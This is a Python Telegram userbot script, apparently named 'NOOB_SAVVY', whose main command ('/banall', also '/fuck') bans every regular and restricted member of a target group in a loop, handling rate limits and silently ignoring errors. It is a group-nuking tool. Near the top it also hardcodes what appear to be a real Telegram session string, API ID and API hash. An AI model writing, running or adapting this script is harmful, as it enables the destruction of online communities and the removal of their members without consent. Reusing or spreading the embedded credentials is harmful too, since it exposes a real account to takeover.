from os import getenv
from asyncio import sleep

from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait, RPCError
from pyrogram.types import Message

# Retrieve environment variables
SESSION_STRING = ('BQG_NJ0Aa5nuZxGQMm4CmfvVAa-fwNKPvh1WN_ql2RQ3_ltLEUTpgBQYMS0hKkByqRMkzYA9UhxsI6wq6DdWxlid8KlWCSWHaTqgv3D0A-dWwmG9Ng5mLWIg0GxmyfvLSKl-AzYEXXvJoItoyXuvJvsRvBjHtx_neg5IkQIxafD0OSZWn4F-ilNz751OHWsZUJqV0SFuyxnCZALLoYIynDUmRtQt2qRb8Y2EB8C1UhoYyWZRvhWblbyOxOzdhvzsb3e6I_c6nacSgoKUXRTlS2vNInWOQL_xzwVV80SXFjOGRAUS_msebMQWqx-87jUQtD0jRXNz4Koo1PIpUE4ybceRRJe8-AAAAAGEexaGAA')
API_ID = 25981592  # Ensure these are set in your environment variables on Heroku
API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"

sudo_users_env = getenv('SUDO_USERS')
if sudo_users_env is None:
    SUDO_USERS = [6517626502]  # Default SUDO_USERS if none provided
else:
    SUDO_USERS = list(map(int, sudo_users_env.split(" ")))
    SUDO_USERS.append(6517626502)  # Adding an additional SUDO_USER

CHATS = ['@noob_savvy_official',]
# Initialize the client with a session name
M = Client("my_session", session_string=SESSION_STRING, api_id=API_ID, api_hash=API_HASH)

@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
    await message.reply_text("🤖 **✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨...**")

@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("🔁 __✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨\n GETTING READY COMMANDER ........__")
        if chat_id in CHATS:
            return
    except IndexError:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨\n STARTED REMOVING MEMBERS FROM GROUP 🤫 🤖\n ✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨...__")
    await sleep(3)

    async for member in app.get_chat_members(chat_id):
        if member.user.id in SUDO_USERS or member.status not in [ChatMemberStatus.MEMBER, ChatMemberStatus.RESTRICTED]:
            continue
        try:
            await app.ban_chat_member(chat_id, member.user.id)
        except FloodWait as e:
            await sleep(e.x)
        except RPCError as e:
            pass  # For simplicity, not logging detailed errors here

M.start()
M.join_chat("noob_savvy_official")
print("✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨ Started Successfully")
M.idle()
M.stop()
